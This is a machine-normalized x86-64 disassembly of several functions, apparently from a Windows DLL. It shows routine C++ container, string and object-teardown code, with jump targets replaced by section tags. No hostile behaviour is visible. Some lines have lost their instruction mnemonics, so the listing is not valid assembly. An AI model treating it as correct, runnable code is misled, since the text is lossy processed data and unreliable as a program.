mov rdi [ rbp - 0x71 ]
mov rbx [ rbp - 0x41 ]
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
or eax 0xffffffff
[ rbx + 0xc ] eax
dec eax
jne r-xdata
mov rbx [ rbp - 0x31 ]
test rbx rbx
je r-xdata
mov eax [ rbx + 0x8 ]
test eax eax
jne r-xdata
cmp rdx rcx
cmovb rdx rcx
lea rcx [ rbp - 0x79 ]
call sub_180004d00
mov r12 [ rbp - 0x69 ]
mov rdi [ rbp - 0x71 ]
mov rsi [ rbp - 0x79 ]
mov rcx rsi
call j_sub_18002094c#2
add rsi 0x8
nop
mov rcx [ rbp - 0x41 ]
mov rax [ rcx ]
call [ rax + 0x8 ]
mov rbx [ rbp - 0x41 ]
mov [ rbp - 0x31 ] rbx
mov rax [ rbp - 0x49 ]
mov [ rbp - 0x39 ] rax
jmp r-xdata
[ rbx + 0x8 ]
jne r-xdata
jmp r-xdata
add rsi 0x10
lea rax [ rsi - 0x8 ]
cmp rax rdi
jne r-xdata
[ rbx + 0x8 ]
jne r-xdata
mov rdi [ rbp - 0x71 ]
mov rsi [ rbp - 0x79 ]
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
mov rbx [ rsi ]
test rbx rbx
je r-xdata
mov rsi [ rbp - 0x79 ]
mov rdi [ rbp - 0x71 ]
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x8 ]
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x8 ]
sub_180005cf0
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov rdi rdx
mov rbx rcx
mov rcx [ rcx + 0x8 ]
cmp rdx rcx
jae r-xdata
cmp rcx [ rbx + 0x10 ]
jne r-xdata
mov rax [ rbx ]
cmp rax rdx
ja r-xdata
mov rcx [ rbx + 0x8 ]
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x48 ] rcx
test rcx rcx
je r-xdata
mov edx 0x1
mov rcx rbx
call sub_180005510
sub rdi rax
mov rax 0x6666666666666667
imul rdi
mov rdi rdx
sar rdi 0x4
mov rax rdi
shr rax 0x3f
add rdi rax
cmp rcx [ rbx + 0x10 ]
jne r-xdata
add [ rbx + 0x8 ] 0x28
mov rbx [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
mov [ rcx + 0x18 ] 0x7
xor eax eax
mov [ rcx + 0x10 ] rax
mov [ rcx ] ax
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rdi
call sub_180001ba0
nop
lea rcx [ rdi + rdi * 4 ]
mov rax [ rbx ]
lea rdx [ rax + rcx * 8 ]
mov rcx [ rbx + 0x8 ]
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x48 ] rcx
test rcx rcx
je r-xdata
mov edx 0x1
mov rcx rbx
call sub_180005510
jmp r-xdata
mov [ rcx + 0x18 ] 0x7
xor eax eax
mov [ rcx + 0x10 ] rax
mov [ rcx ] ax
or r9 0xffffffffffffffff
xor r8d r8d
call sub_180001ba0
nop
sub_180005df0
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x27 ]
sub rsp 0xa0
mov [ rbp - 0x19 ] 0xfffffffffffffffe
mov [ rsp + 0xe0 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x17 ] rax
mov rax r9
mov [ rbp - 0x31 ] rax
mov r12 rdx
mov [ rbp - 0x21 ] rdx
xor r9d r9d
mov [ rbp - 0x29 ] r9d
mov [ rbp - 0x59 ] r9d
mov esi r9d
mov [ rbp - 0x51 ] r9
mov ebx r9d
mov [ rbp - 0x49 ] rbx
mov r14d r9d
mov [ rbp - 0x41 ] r9
mov rdi [ rw-data ]
cmp rax rdi
jae r-xdata
mov rax [ rw-data ]
movzx ecx [ rax + r8 ]
mov [ rbp - 0x59 ] cx
mov rax [ rw-data ]
movzx edx [ rax + r8 ]
mov [ rbp - 0x57 ] dl
mov rax [ rw-data ]
movzx eax [ rax + r8 ]
mov [ rbp - 0x56 ] al
lea r13 [ rdi + r8 ]
mov r15 r9
cmp [ rbp - 0x31 ] r9
jbe r-xdata
mov [ rdx ] r9d
lea rcx [ rdx + 0x8 ]
lea rdx [ rbp - 0x51 ]
call sub_1800028f0
nop
jmp r-xdata
mov [ r12 ] cx
mov [ r12 + 0x2 ] dl
mov [ r12 + 0x3 ] al
lea rcx [ r12 + 0x8 ]
lea rdx [ rbp - 0x51 ]
call sub_1800028f0
nop
mov r12 [ rbp - 0x31 ]
nop [ rax ] eax
lea rcx [ rbp - 0x51 ]
call sub_180002870
mov rax r12
mov rcx [ rbp + 0x17 ]
xor rcx rsp
call sub_1800212e0
mov rbx [ rsp + 0xe0 ]
add rsp 0xa0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
inc r15
inc r13
cmp r15 r12
jb r-xdata
inc r15
inc r13
mov [ rbp + 0x7 ] 0x7
mov [ rbp - 0x1 ] r9
mov [ rbp - 0x11 ] r9w
xor eax eax
or rcx 0xffffffffffffffff
mov rdi r13
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rdx r13
lea rcx [ rbp - 0x11 ]
call sub_180003930
nop
lea rax [ rbp - 0x11 ]
cmp rax rbx
jae r-xdata
movzx ecx [ r13 ]
movsx eax [ rw-data ]
cmp ecx eax
jne r-xdata
movzx eax [ rbp - 0x56 ]
movzx edx [ rbp - 0x57 ]
movzx ecx [ rbp - 0x59 ]
mov r12 [ rbp - 0x21 ]
cmp rbx r14
jne r-xdata
lea rax [ rbp - 0x11 ]
cmp rsi rax
ja r-xdata
mov [ rbp - 0x31 ] rbx
mov [ rbp - 0x29 ] rbx
test rbx rbx
je r-xdata
mov edx 0x1
lea rcx [ rbp - 0x51 ]
call sub_180005510
mov r14 [ rbp - 0x41 ]
mov rbx [ rbp - 0x49 ]
mov rsi [ rbp - 0x51 ]
lea rcx [ rbp - 0x11 ]
sub rcx rsi
mov rax 0x6666666666666667
imul rcx
mov rdi rdx
sar rdi 0x4
mov rax rdi
shr rax 0x3f
add rdi rax
cmp rbx r14
jne r-xdata
add rbx 0x28
mov [ rbp - 0x49 ] rbx
cmp [ rbp + 0x7 ] 0x8
jb r-xdata
mov [ rbx + 0x18 ] 0x7
xor eax eax
mov [ rbx + 0x10 ] rax
mov [ rbx ] ax
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp - 0x11 ]
mov rcx rbx
call sub_180001ba0
nop
lea rax [ rdi + rdi * 4 ]
lea rdx [ rsi + rax * 8 ]
mov [ rbp - 0x31 ] rbx
mov [ rbp - 0x29 ] rbx
test rbx rbx
je r-xdata
mov edx 0x1
lea rcx [ rbp - 0x51 ]
call sub_180005510
mov r14 [ rbp - 0x41 ]
mov rbx [ rbp - 0x49 ]
mov rsi [ rbp - 0x51 ]
xor r9d r9d
mov rcx [ rbp - 0x11 ]
call j_sub_18002094c#2
jmp r-xdata
mov [ rbx + 0x18 ] 0x7
xor eax eax
mov [ rbx + 0x10 ] rax
mov [ rbx ] ax
or r9 0xffffffffffffffff
xor r8d r8d
mov rcx rbx
call sub_180001ba0
nop
sub_180006080
mov [ rsp + 0x18 ] r8
push rbx
push rsi
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rbx r8
mov rsi rdx
mov rdi rcx
mov [ rsp + 0x50 ] rbx
mov rax rbx
add rsp 0x30
pop rdi
pop rsi
pop rbx
retn
mov [ rsp + 0x58 ] rbx
test rbx rbx
je r-xdata
add rbx 0x28
mov [ rsp + 0x60 ] rbx
add rdi 0x28
jmp r-xdata
movzx eax [ rdi ]
mov [ rbx ] ax
movzx eax [ rdi + 0x2 ]
mov [ rbx + 0x2 ] al
movzx eax [ rdi + 0x3 ]
mov [ rbx + 0x3 ] al
lea rdx [ rdi + 0x8 ]
lea rcx [ rbx + 0x8 ]
call sub_1800028f0
nop
cmp rdi rsi
je r-xdata
sub_1800060f0
mov rax rsp
push rsi
push rdi
push r12
sub rsp 0x80
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x20 ] rbp
movzx esi r8w
mov rbx rdx
mov rbp rcx
xor r12d r12d
mov [ rsp + 0xb0 ] r12d
mov [ rax - 0x70 ] r12d
mov [ rax - 0x68 ] r12
mov [ rax - 0x60 ] r12
mov [ rax - 0x58 ] r12
lea ecx [ r12 + 0x30 ]
call sub_180021000
mov [ rsp + 0xa0 ] rax
test rax rax
je r-xdata
mov rdi r12
mov rcx rax
call sub_180017520
mov rdi rax
jmp r-xdata
test rsi rsi
jne r-xdata
mov rcx rdi
call sub_180017560
mov rcx rdi
call j_sub_18002094c#2
mov r8d 0xb
lea rdx [ rw-data ]
mov rcx rdi
call sub_1800175a0
mov r8d 0x8
lea rdx [ rw-data ]
mov rcx rdi
call sub_180017590
lea rdx [ rsp + 0x50 ]
mov rcx rdi
call sub_180017bc0
mov rcx [ rbp + 0x38 ]
mov r9 [ rcx ]
movzx r8d si
mov rdx rax
call [ r9 + 0x8 ]
mov rsi rax
test rdi rdi
je r-xdata
mov rcx [ rbp + 0x20 ]
mov rax [ rcx ]
mov rdx rsi
call [ rax + 0x10 ]
mov rdi rax
mov rcx [ rsi ]
test rcx rcx
je r-xdata
mov [ rbx ] r12d
lea rcx [ rbx + 0x8 ]
lea rdx [ rsp + 0x30 ]
call sub_1800028f0
nop
jmp r-xdata
mov rcx rsi
call j_sub_18002094c#2
test rdi rdi
jne r-xdata
call sub_18002094c
lea rcx [ rsp + 0x30 ]
call sub_180002870
mov rax rbx
lea r11 [ rsp + 0x80 ]
mov rbx [ r11 + 0x28 ]
mov rbp [ r11 + 0x38 ]
mov rsp r11
pop r12
pop rdi
pop rsi
retn
mov r9 [ rdi + 0x10 ]
mov r8 [ rdi + 0x8 ]
lea rdx [ rsp + 0x50 ]
mov rcx rbp
call sub_180005df0
nop
movzx ecx [ rax ]
mov [ rsp + 0x28 ] cx
movzx ecx [ rax + 0x2 ]
mov [ rsp + 0x2a ] cl
movzx ecx [ rax + 0x3 ]
mov [ rsp + 0x2b ] cl
lea rdx [ rax + 0x8 ]
lea rcx [ rsp + 0x30 ]
call sub_180005350
nop
lea rcx [ rsp + 0x58 ]
call sub_180002870
mov rcx [ rdi + 0x8 ]
test rcx rcx
je r-xdata
mov [ rbx ] r12d
lea rcx [ rbx + 0x8 ]
lea rdx [ rsp + 0x30 ]
call sub_1800028f0
nop
jmp r-xdata
mov rcx rdi
call j_sub_18002094c#2
movzx r11d [ rsp + 0x28 ]
mov [ rbx ] r11w
movzx eax [ rsp + 0x2a ]
mov [ rbx + 0x2 ] al
movzx eax [ rsp + 0x2b ]
mov [ rbx + 0x3 ] al
lea rcx [ rbx + 0x8 ]
lea rdx [ rsp + 0x30 ]
call sub_1800028f0
nop
call sub_18002094c
sub_1800062d0
cmp rcx rdx
je r-xdata
retn
push rbp
sub rsp 0x20
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x38 ] rsi
mov [ rsp + 0x40 ] rdi
mov [ rsp + 0x48 ] r12
mov rbp rdx
lea rdi [ rcx + 0x8 ]
xor r12d r12d
nop [ rax ] eax
mov [ rdi ] r12
mov [ rdi + 0x8 ] r12
mov [ rdi + 0x10 ] r12
add rdi 0x28
lea rax [ rdi - 0x8 ]
cmp rax rbp
jne r-xdata
mov rsi [ rdi + 0x8 ]
cmp rbx rsi
je r-xdata
mov rbx [ rdi ]
test rbx rbx
je r-xdata
mov r12 [ rsp + 0x48 ]
mov rdi [ rsp + 0x40 ]
mov rsi [ rsp + 0x38 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rbp
mov rcx [ rdi ]
call j_sub_18002094c#2
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r12
mov [ rbx ] r12w
add rbx 0x28
cmp rbx rsi
jne r-xdata
mov rcx [ rbx ]
call j_sub_18002094c#2
sub_180006380
push rdi
push r12
push r13
sub rsp 0x40
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov [ rsp + 0x60 ] rbx
mov [ rsp + 0x70 ] rsi
mov rdi rdx
mov rbx rcx
mov rax 0x666666666666666
cmp rdx rax
jbe r-xdata
mov rcx [ rcx + 0x10 ]
sub rcx [ rbx ]
mov r13 0x6666666666666667
mov rax r13
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdx rdi
jae r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
mov rbx [ rsp + 0x60 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x40
pop r13
pop r12
pop rdi
retn
mov rdx rdi
lea rcx [ rbx + 0x18 ]
call sub_180003230
mov rsi rax
mov [ rsp + 0x68 ] rax
movzx eax [ rsp + 0x68 ]
mov [ rsp + 0x28 ] al
mov [ rsp + 0x20 ] 0x0
lea r9 [ rbx + 0x18 ]
mov r8 rsi
mov rdx [ rbx + 0x8 ]
mov rcx [ rbx ]
call sub_180006080
nop
mov r11 [ rbx + 0x8 ]
mov r10 [ rbx ]
mov rcx r11
sub rcx r10
mov rax r13
imul rcx
mov r13 rdx
sar r13 0x4
mov rax r13
shr rax 0x3f
add r13 rax
test r10 r10
je r-xdata
lea rax [ rdi + rdi * 4 ]
lea rcx [ rsi + rax * 8 ]
mov [ rbx + 0x10 ] rcx
lea rax [ r13 + r13 * 4 ]
lea rcx [ rsi + rax * 8 ]
mov [ rbx + 0x8 ] rcx
mov [ rbx ] rsi
movzx r9d [ rsp + 0x68 ]
lea r8 [ rbx + 0x18 ]
mov rdx r11
mov rcx r10
call sub_1800062d0
mov rcx [ rbx ]
call j_sub_18002094c#2
sub_1800064a0
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx ]
test rcx rcx
je r-xdata
xor eax eax
mov [ rbx ] rax
mov [ rbx + 0x8 ] rax
mov [ rbx + 0x10 ] rax
add rsp 0x20
pop rbx
retn
movzx r9d [ rsp + 0x30 ]
mov rdx [ rbx + 0x8 ]
lea r8 [ rbx + 0x18 ]
call sub_1800062d0
mov rcx [ rbx ]
call j_sub_18002094c#2
sub_1800064e0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] r8
push rbp
push rsi
push r12
sub rsp 0x20
mov rbp [ rcx + 0x8 ]
lea rbx [ r8 + 0x28 ]
mov r12 rdx
mov rsi rcx
cmp rbx rbp
je r-xdata
mov rdx [ rsi + 0x8 ]
movzx r9d [ rsp + 0x50 ]
lea r8 [ rsi + 0x18 ]
lea rcx [ rdx - 0x28 ]
call sub_1800062d0
mov rax [ rsp + 0x50 ]
add [ rsi + 0x8 ] 0xffffffffffffffd8
mov rbx [ rsp + 0x48 ]
mov [ r12 ] rax
mov rax r12
add rsp 0x20
pop r12
pop rsi
pop rbp
retn
mov [ rsp + 0x40 ] rdi
lea rdi [ r8 + 0x3 ]
nop
movzx eax [ rbx ]
lea rdx [ rbx + 0x8 ]
lea rcx [ rdi + 0x5 ]
mov [ rdi - 0x3 ] ax
movzx eax [ rbx + 0x2 ]
mov [ rdi - 0x1 ] al
movzx eax [ rbx + 0x3 ]
mov [ rdi ] al
call sub_180005350
add rbx 0x28
add rdi 0x28
cmp rbx rbp
jne r-xdata
mov rdi [ rsp + 0x40 ]
sub_180006580
push rdi
sub rsp 0x20
mov r8 [ rcx + 0x8 ]
mov r11 rdx
mov rdi 0x6666666666666667
sub r8 [ rcx ]
mov rax rdi
mov r9 0x666666666666666
mov r10 rcx
imul r8
mov r8 rdx
sar r8 0x4
mov rax r8
shr rax 0x3f
add r8 rax
mov rax r9
sub rax r11
cmp rax r8
jae r-xdata
mov rcx [ rcx + 0x10 ]
mov rax rdi
add r8 r11
sub rcx [ r10 ]
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp r8 rdx
jbe r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
add rsp 0x20
pop rdi
retn
mov rax rdx
shr rax 0x1
sub r9 rax
cmp r9 rdx
jae r-xdata
add rdx rax
xor edx edx
jmp r-xdata
cmp rdx r8
mov rcx r10
cmovb rdx r8
call sub_180006380
sub_180006630
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x27 ]
sub rsp 0xd0
mov [ rbp - 0x51 ] 0xfffffffffffffffe
mov [ rsp + 0x120 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x17 ] rax
mov r13 rdx
mov rbx rcx
mov [ rbp - 0x59 ] rcx
xor r15d r15d
mov [ rcx + 0x8 ] r15w
lea rax [ r--data ]
mov [ rcx ] rax
lea rax [ r--data ]
mov [ rcx + 0x10 ] rax
mov [ rcx + 0x48 ] r15
mov [ rcx + 0x50 ] r15
mov [ rcx + 0x58 ] r15
mov [ rcx + 0x70 ] r15
mov [ rcx + 0x78 ] r15
mov [ rcx + 0x80 ] r15
mov [ rcx + 0x98 ] r15
mov [ rcx + 0xa0 ] r15
mov [ rcx + 0xa8 ] r15
lea ecx [ r15 + 0x30 ]
call sub_180021000
mov [ rbp - 0x79 ] rax
test rax rax
je r-xdata
mov rsi r15
mov [ rsp + 0x20 ] 0xb
lea r9 [ rw-data ]
lea r8d [ r15 + 0x3e ]
lea rdx [ rw-data ]
mov rcx rax
call sub_180017530
mov rsi rax
jmp r-xdata
mov rax r15
movups xmm0 [ rw-data ]
movaps [ rbp - 0x69 ] xmm0
lea r9 [ rbp - 0x69 ]
mov r8 r12
mov rdx r13
mov rcx rax
call sub_18001e940
jmp r-xdata
mov rcx rsi
call j_sub_1800175b0
mov r12 rax
mov ecx 0x98
call sub_180021000
mov [ rbp - 0x79 ] rax
test rax rax
je r-xdata
mov rax [ rbx + 0x28 ]
test rax rax
lea rcx [ rax + 0x8 ]
jne r-xdata
mov rcx rsi
call sub_180017560
mov rcx rsi
call j_sub_18002094c#2
mov [ rbx + 0x28 ] rax
mov rcx r12
call sub_18002094c
test rsi rsi
je r-xdata
mov [ rbx + 0x30 ] rcx
mov [ rbx + 0x38 ] rax
mov ecx 0x30
call sub_180021000
mov [ rbp - 0x79 ] rax
test rax rax
je r-xdata
mov rcx r15
mov rsi r15
mov [ rsp + 0x20 ] 0xb
lea r9 [ rw-data ]
mov r8d 0x32
lea rdx [ rw-data ]
mov rcx rax
call sub_180017530
mov rsi rax
jmp r-xdata
mov rax [ r11 ]
mov [ rbp - 0x21 ] rax
mov rax [ r11 + 0x8 ]
mov [ rbp - 0x19 ] rax
mov rax [ r11 + 0x10 ]
mov [ rbp - 0x11 ] rax
mov rax [ r11 + 0x18 ]
mov [ rbp - 0x9 ] rax
mov rax [ r11 + 0x20 ]
mov [ rbp - 0x1 ] rax
mov rax [ r11 + 0x28 ]
mov [ rbp + 0x7 ] rax
movzx eax [ r11 + 0x30 ]
mov [ rbp + 0xf ] ax
cmp [ rbp - 0x31 ] 0x10
jb r-xdata
mov r11 [ rax ]
mov [ rbp - 0x21 ] 0x0
xor eax eax
mov [ rbp - 0x20 ] rax
mov [ rbp - 0x18 ] rax
mov [ rbp - 0x10 ] rax
mov [ rbp - 0x8 ] rax
mov [ rbp ] rax
mov [ rbp + 0x8 ] rax
mov [ rbp + 0x10 ] al
lea rdx [ rbp - 0x49 ]
mov rcx rsi
call sub_180017d20
mov r11 rax
cmp [ rax + 0x18 ] 0x10
jb r-xdata
test rsi rsi
je r-xdata
mov rcx [ rbp - 0x49 ]
call j_sub_18002094c#2
mov ecx 0x18
call sub_180021000
mov [ rbp - 0x79 ] rax
test rax rax
je r-xdata
mov rcx rsi
call sub_180017560
mov rcx rsi
call j_sub_18002094c#2
mov rax r15
mov r8d 0x32
lea rdx [ rbp - 0x21 ]
mov rcx rax
call sub_18001c660
jmp r-xdata
mov rax r15
lea rdx [ rbx + 0x10 ]
mov rcx rax
call sub_180002710
jmp r-xdata
mov [ rbx + 0x20 ] rax
mov [ rbx + 0x68 ] 0xff
mov ecx 0x78
call sub_180021000
mov [ rbp - 0x79 ] rax
test rax rax
je r-xdata
mov rax r15
mov rcx rax
call sub_18001f270
jmp r-xdata
mov [ rbx + 0x18 ] rax
mov ecx 0x10
call sub_180021000
mov [ rbp - 0x79 ] rax
test rax rax
je r-xdata
mov rax [ rbx + 0x50 ]
test rax rax
je r-xdata
mov edx 0x1
lea rcx [ rbx + 0x48 ]
call sub_18000af10
mov [ rbx + 0x40 ] rax
mov eax [ rw-data ]
mov [ rbx + 0xb8 ] eax
mov eax [ rw-data ]
mov [ rbx + 0xbc ] eax
mov [ rbx + 0xc0 ] 0x0
movzx eax [ rw-data ]
mov [ rbx + 0x8 ] ax
mov rsi [ rbx + 0x48 ]
sub rsi rsi
sar rsi 0x3
mov rax [ rbx + 0x58 ]
cmp [ rbx + 0x50 ] rax
jne r-xdata
add [ rbx + 0x50 ] 0x8
mov r8 [ rbx + 0x50 ]
lea rdx [ r8 - 0x8 ]
mov rcx [ rbx + 0x48 ]
lea rcx [ rcx + rsi * 8 ]
cmp rcx rdx
je r-xdata
mov [ rax ] rbx
mov rax rbx
mov rcx [ rbp + 0x17 ]
xor rcx rsp
call sub_1800212e0
mov rbx [ rsp + 0x120 ]
add rsp 0xd0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
cmp rdx r8
je r-xdata
jmp r-xdata
mov [ rsp + 0x20 ] r15
xor r9d r9d
call sub_180003690
nop
jmp r-xdata
sub_180006980
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x48 ] rbx
mov rbx rcx
lea rax [ r--data ]
mov [ rcx ] rax
lea rax [ r--data ]
mov [ rcx + 0x10 ] rax
mov rcx [ rcx + 0x40 ]
call j_sub_18002094c#2
mov rdi [ rbx + 0x18 ]
test rdi rdi
je r-xdata
mov rdi [ rbx + 0x20 ]
test rdi rdi
je r-xdata
mov rcx rdi
call sub_1800022c0
mov rcx rdi
call j_sub_18002094c#2
mov rdi [ rbx + 0x28 ]
test rdi rdi
je r-xdata
mov rcx rdi
call sub_18001c270
mov rcx rdi
call j_sub_18002094c#2
mov rcx [ rbx + 0x98 ]
test rcx rcx
je r-xdata
mov rcx rdi
call sub_18001c970
mov rcx rdi
call j_sub_18002094c#2
nop
xor edi edi
mov [ rbx + 0x98 ] rdi
mov [ rbx + 0xa0 ] rdi
mov [ rbx + 0xa8 ] rdi
mov rcx [ rbx + 0x70 ]
test rcx rcx
je r-xdata
lea r8 [ rbx + 0xb0 ]
movzx r9d [ rsp + 0x40 ]
mov rdx [ rbx + 0xa0 ]
call sub_1800062d0
mov rcx [ rbx + 0x98 ]
call j_sub_18002094c#2
mov [ rbx + 0x70 ] rdi
mov [ rbx + 0x78 ] rdi
mov [ rbx + 0x80 ] rdi
mov rcx [ rbx + 0x48 ]
test rcx rcx
je r-xdata
call j_sub_18002094c#2
mov [ rbx + 0x48 ] rdi
mov [ rbx + 0x50 ] rdi
mov [ rbx + 0x58 ] rdi
lea rax [ r--data ]
mov [ rbx ] rax
mov rbx [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
call j_sub_18002094c#2
sub_180006aa0
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov rdi rdx
mov rbx rcx
mov rcx [ rcx + 0x8 ]
cmp rdx rcx
jae r-xdata
cmp rcx [ rbx + 0x10 ]
jne r-xdata
mov rax [ rbx ]
cmp rax rdx
ja r-xdata
mov rcx [ rbx + 0x8 ]
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x48 ] rcx
test rcx rcx
je r-xdata
mov edx 0x1
mov rcx rbx
call sub_180006580
sub rdi rax
mov rax 0x6666666666666667
imul rdi
mov rdi rdx
sar rdi 0x4
mov rax rdi
shr rax 0x3f
add rdi rax
cmp rcx [ rbx + 0x10 ]
jne r-xdata
add [ rbx + 0x8 ] 0x28
mov rbx [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
movzx eax [ rdi ]
mov [ rcx ] ax
movzx eax [ rdi + 0x2 ]
mov [ rcx + 0x2 ] al
movzx eax [ rdi + 0x3 ]
mov [ rcx + 0x3 ] al
lea rdx [ rdi + 0x8 ]
add rcx 0x8
call sub_1800028f0
nop
lea rdx [ rdi + rdi * 4 ]
mov r8 [ rbx ]
mov rcx [ rbx + 0x8 ]
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x48 ] rcx
test rcx rcx
je r-xdata
mov edx 0x1
mov rcx rbx
call sub_180006580
jmp r-xdata
movzx eax [ r8 + rdx * 8 ]
mov [ rcx ] ax
movzx eax [ r8 + rdx * 8 + 0x2 ]
mov [ rcx + 0x2 ] al
movzx eax [ r8 + rdx * 8 + 0x3 ]
mov [ rcx + 0x3 ] al
lea rdx [ r8 + rdx * 8 + 0x8 ]
add rcx 0x8
call sub_1800028f0
nop
sub_180006ba0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov ebx edx
mov rdi rcx
call sub_180006980
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_18002094c#2
sub_180006bd0
mov rax rsp
push rbp
lea rbp [ rax - 0x5f ]
sub rsp 0xa0
mov [ rbp + 0x27 ] 0xfffffffffffffffe
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rdi
mov rbx rdx
mov rdi rcx
mov rax [ rdx ]
lea rdx [ rbp + 0x2f ]
mov rcx rbx
call [ rax + 0x28 ]
nop
movzx r8d [ rax ]
lea rdx [ rbp - 0x29 ]
mov rcx rdi
call sub_1800060f0
nop
lea rcx [ rbp + 0x37 ]
call sub_180002870
cmp [ rbp - 0x29 ] 0x0
jne r-xdata
lea rcx [ rdi + 0x98 ]
lea rdx [ rbp - 0x29 ]
call sub_180006aa0
mov rcx [ rdi + 0x18 ]
mov rax [ rcx ]
mov rdx rbx
call [ rax + 0x18 ]
movzx r11d [ rbp - 0x29 ]
mov [ rbp - 0x1 ] r11w
movzx eax [ rbp - 0x27 ]
mov [ rbp + 0x1 ] al
movzx eax [ rbp - 0x26 ]
mov [ rbp + 0x2 ] al
lea rdx [ rbp - 0x21 ]
lea rcx [ rbp + 0x7 ]
call sub_1800028f0
mov rcx [ rdi + 0x18 ]
mov rax [ rcx ]
lea rdx [ rbp - 0x1 ]
call [ rax + 0x28 ]
nop
lea rcx [ rbp - 0x21 ]
call sub_180002870
lea r11 [ rsp + 0xa0 ]
mov rbx [ r11 + 0x10 ]
mov rdi [ r11 + 0x18 ]
mov rsp r11
pop rbp
retn
mov rax [ rbp - 0x19 ]
cmp [ rbp - 0x21 ] rax
jne r-xdata
mov rax [ rbx ]
lea rdx [ rbp - 0x1 ]
mov rcx rbx
call [ rax + 0x28 ]
nop
movzx ecx [ rax ]
mov [ rbp - 0x29 ] cx
movzx ecx [ rax + 0x2 ]
mov [ rbp - 0x27 ] cl
movzx ecx [ rax + 0x3 ]
mov [ rbp - 0x26 ] cl
lea rdx [ rax + 0x8 ]
lea rcx [ rbp - 0x21 ]
call sub_180005350
nop
lea rcx [ rbp + 0x7 ]
call sub_180002870
movzx r11d [ rbp - 0x29 ]
mov [ rbp - 0x1 ] r11w
movzx eax [ rbp - 0x27 ]
mov [ rbp + 0x1 ] al
movzx eax [ rbp - 0x26 ]
mov [ rbp + 0x2 ] al
lea rdx [ rbp - 0x21 ]
lea rcx [ rbp + 0x7 ]
call sub_1800028f0
lea rdx [ rbp - 0x1 ]
mov rcx rdi
call sub_1800051b0
sub_180006d10
mov [ rsp + 0x10 ] rdx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x20 ]
sub rsp 0x120
mov [ rbp - 0x40 ] 0xfffffffffffffffe
mov [ rsp + 0x160 ] rbx
mov rbx rcx
xor edi edi
mov [ rbp + 0x70 ] edi
mov r8 [ rdx ]
movzx eax [ r8 + 0x6 ]
dec eax
cmp eax 0x3c
ja r-xdata
mov rbx [ rbp + 0x68 ]
mov rbx [ rbx + 0x8 ]
test rbx rbx
je r-xdata
cdqe
lea rdx [ __dos_header ]
movzx eax [ rdx + rax + 0x72b4 ]
mov ecx [ rdx + rax * 4 + 0x7280 ]
add rcx rdx
jmp rcx
mov al 0x1
mov rbx [ rsp + 0x160 ]
add rsp 0x120
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
or eax 0xffffffff
[ rbx + 0x8 ] eax
dec eax
jne r-xdata
mov rcx rbx
call sub_1800055c0
jmp r-xdata
mov rcx rbx
call sub_1800047c0
jmp r-xdata
cmp [ r8 + 0x10 ] 0x4
jne r-xdata
cmp [ r8 + 0x10 ] 0x4
jne r-xdata
mov [ rsp + 0x60 ] 0x7
mov [ rsp + 0x58 ] rdi
mov [ rsp + 0x48 ] di
xor r8d r8d
lea rdx [ r--data ]
lea rcx [ rsp + 0x48 ]
call sub_180003930
mov rcx [ rbx + 0x38 ]
mov rax [ rcx ]
mov r9d [ rw-data ]
lea r8 [ rsp + 0x48 ]
mov edx [ rbx + 0xb8 ]
call [ rax + 0x10 ]
mov [ rbp - 0x78 ] 0x7
mov [ rbp - 0x80 ] rdi
mov [ rsp + 0x70 ] di
xor r8d r8d
lea rdx [ r--data ]
lea rcx [ rsp + 0x70 ]
call sub_180003930
mov rcx [ rbx + 0x38 ]
mov rax [ rcx ]
mov r9d [ rw-data ]
